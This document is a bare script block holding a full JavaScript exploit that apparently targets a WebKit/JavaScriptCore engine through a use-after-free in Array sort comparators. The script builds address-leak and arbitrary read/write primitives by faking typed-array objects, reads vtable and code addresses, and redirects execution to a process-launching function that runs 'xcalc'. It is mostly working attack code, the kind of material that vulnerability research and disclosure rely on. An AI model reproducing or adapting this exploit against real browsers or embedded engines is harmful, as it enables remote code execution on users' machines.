<script>
var holdRefs = new Array();
var arr;
var byteLen = null;
var outBuf = null;
var iters;
var actionIter;
var ptrToFree;
var arrayStorageSize = 40;

function shiftingExpandingCompFunc(x, y)
{
  if (iters == 0) {
    // On the first comparison of [0] and [1], shift the C++ object header to
    // [2].
    arr.splice(0, 7);
  } else if (iters == actionIter) {
    // On the last comparison, expand the Array and then allocate an ArrayBuffer
    // buffer into the freed hole, which will get written to.
    var oldLen = arr.length;
    for (i = 0; i < oldLen; ++i) {
      arr[oldLen + i] = 0x41;
    }
    outBuf = new ArrayBuffer(byteLen);
  }
  iters++;

  return 0;
}

function freeingCompFunc(x, y)
{
  if (ptrToFree == 0) {
    return 0;
  }
  // This expands the array storage, leaving a free hole.
  arr[2] = 0x41;
  // Fill the free hole.
  var holeSize = arrayStorageSize + 16;
  var arrBuf = new ArrayBuffer(holeSize);
  var u8Buf = new Uint8Array(arrBuf);
  var startIndex = 8 // m_sparseValueMap;
  // Set ArrayStorage::m_sparseValueMap in the buffer that filled the hole.
  // The use-after-free will pick up this value and fastFree() it.
  setPtr(u8Buf, startIndex, ptrToFree);

  return 0;
}

function getArrayBuffer(byteSize)
{
  var numElements = (byteSize - arrayStorageSize) / 8;
  arr = createArrayWithExactAllocationLength(numElements);
  // The array will be left in a dubious state so make sure it doesn't get
  // garbage collected.
  holdRefs.push(arr);
  for (i = 0; i < numElements; ++i) {
    arr[i] = 0;
  }
  actionIter = 0;
  iters = 0;
  // Run the sort a first time to see how many sort comparisons the sort tree
  // needs. We could calculate this but its easier to just measure.
  arr.sort(shiftingExpandingCompFunc);
  actionIter = iters - 1;

  arr = createArrayWithExactAllocationLength(numElements);
  holdRefs.push(arr);
  for (i = 0; i < numElements; ++i) {
    arr[i] = 0;
  }
  iters = 0;
  byteLen = byteSize;
  // Run the sort a second time and do the corruptions for real.
  arr.sort(shiftingExpandingCompFunc);

  return outBuf;
}

function getArrayStoragePointer(u8Buf) {
  return bytesToPtr(u8Buf, arrayStorageSize + 24);
}

function doFreePtr(ptr) {
  ptrToFree = ptr;
  arr = [1, 2];
  arr.sort(freeingCompFunc);
}

function bytesToPtr(u8Buf, offset) {
  var ret = 0;
  for (i = 8 - 1; i >= 0; --i) {
    ret *= 256;
    ret += u8Buf[offset + i];
  }
  return ret;
}

function setPtr(u8Buf, offset, ptr) {
  var val;
  for (i = 0; i < 8; ++i) {
    val = ptr & 255;
    u8Buf[offset + i] = val;
    ptr -= val;
    ptr /= 256;
  }
}

function setHalfPtr(u8Buf, offset, ptr) {
  var val;
  for (i = 0; i < 4; ++i) {
    val = ptr & 255;
    u8Buf[offset + i] = val;
    ptr -= val;
    ptr /= 256;
  }
}

function setStr(u8Buf, offset, str) {
  for (i = 0; i < str.length; ++i) {
    u8Buf[2*i + offset] = str.charCodeAt(i);
  }
}

function readPtr(addr, str) {
  setPtr(u8Buf, 8, addr);
  return str.charCodeAt(0) + str.charCodeAt(1)*65536 + str.charCodeAt(2)*4294967296
}

function clearBuf(buf) {
  for (i = 0; i < buf.length; ++i) {
    buf[i] = 0;
  }
}

function addrof(obj) {
    var buf;
    var a = [obj,obj];
    a.sort(function(x,y) { a[2] = 0x42; buf = new ArrayBuffer(56); return 0; });
    buf = new Uint32Array(buf)
    return buf[11]*4294967296+buf[10]
}

function getAliasedBuffer(byteSize, aliasFunc) {
  var arrBuf = getArrayBuffer(byteSize);
  var u8Buf = new Uint8Array(arrBuf);
  var ptr = getArrayStoragePointer(u8Buf);
  alert('buffer, size ' + byteSize + ', is at: 0x' + ptr.toString(16));

  // Need to make sure the buffer is cleared, otherwise the HashMap destructor
  // will see non-null pointer values and try and use them.
  clearBuf(u8Buf);
  doFreePtr(ptr);

  var ret = {};
  ret.ptr = ptr;
  ret.arrBuf = arrBuf;
  ret.u8Buf = u8Buf;
  ret.aliased = aliasFunc();
  return ret;
}

function createArrayWithExactAllocationLength(length) {
  var tempArr = new Array(length);
  // This particular API creates an exactly sized memory allocation for the
  // ArrayStorage with no slop space. Useful.
  return tempArr.splice(0);
}

function createString() {
  return 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
}

function create256SlotArray() {
  return createArrayWithExactAllocationLength(256);
}

// Alias StringImpl and Uint8Array
var aliasDetails = getAliasedBuffer(104,
                                createString);
var ptr = aliasDetails.ptr;
var u8Buf = aliasDetails.u8Buf;
var str = aliasDetails.aliased;
setHalfPtr(u8Buf, 0, 0x10000000) // change string length

// Read vtable pointer from a Uint8Array instance
var tmp = new Uint8Array;
var tmpaddr = addrof(tmp);
var jsuint8arrayVtbl = readPtr(tmpaddr, str); // read vtable at tmpaddr
alert('vtbl: 0x' + jsuint8arrayVtbl.toString(16));

// Read pointer to text section
var jsfuncaddr = addrof(alert);
var nativeExecutableAddr = readPtr(jsfuncaddr+0x30, str);
var alertAddr = readPtr(nativeExecutableAddr+0x18, str);
alert('alert: 0x' + alertAddr.toString(16));

setPtr(u8Buf, 8, alertAddr)
alert(str.indexOf("\u0a20"))

// Alias ArrayStorage of an Array and Uint8Array
aliasDetails = getAliasedBuffer(arrayStorageSize+8*256,
                                create256SlotArray);
var ptr = aliasDetails.ptr;
var u8Buf = aliasDetails.u8Buf;
var jsArr = aliasDetails.aliased;
var jsUint8Ptr = ptr + arrayStorageSize + 16;
var uint8Ptr = ptr + arrayStorageSize + 64;

// Fake element[0] to be a JavaScript object. Points to a fake JSUint8Array.
setPtr(u8Buf, arrayStorageSize, jsUint8Ptr);

// Fake a JSUint8Array
// Needs a correct vtable pointer for the object to be usable from javascript
setPtr(u8Buf, arrayStorageSize + 16, jsuint8arrayVtbl);
setPtr(u8Buf,
       arrayStorageSize +
       16 + 48, // offset_jsuint8_uint8
       uint8Ptr);

// Fake a Uint8Array: start pointer is alertAddr start, length 0xffffffff.
setPtr(u8Buf,
       arrayStorageSize +
       64 + 16 + 8, // offset_uint8_buf
       alertAddr);
setPtr(u8Buf,
       arrayStorageSize +
       64 + 40 + 8, // offset_uint8_len
       0xffffffff);
var readWriteBuf = jsArr[0];

var startDetachedAddr = alertAddr + 0x11ed300;
alert("startDetached 0x" +  startDetachedAddr.toString(16))
var cmd = "xcalc"
setPtr(u8Buf, arrayStorageSize + 8, ptr + arrayStorageSize + 128);
setPtr(u8Buf, arrayStorageSize + 128, ptr + arrayStorageSize + 128 + 8);// hybrid vtable and QString Data structure, can't use offset 0x28 of vtable as QString Data
setPtr(u8Buf, arrayStorageSize + 128 + 2*8, cmd.length);
setPtr(u8Buf, arrayStorageSize + 128 + 3*8, ptr + arrayStorageSize + 128 + 4*8 + 0x28);
setStr(u8Buf, arrayStorageSize + 128 + 4*8 + 0x28, cmd);
setPtr(u8Buf, arrayStorageSize + 128 + 8 + 0x28, startDetachedAddr);
var runtimeobject = jsArr[1];
runtimeobject();

</script>
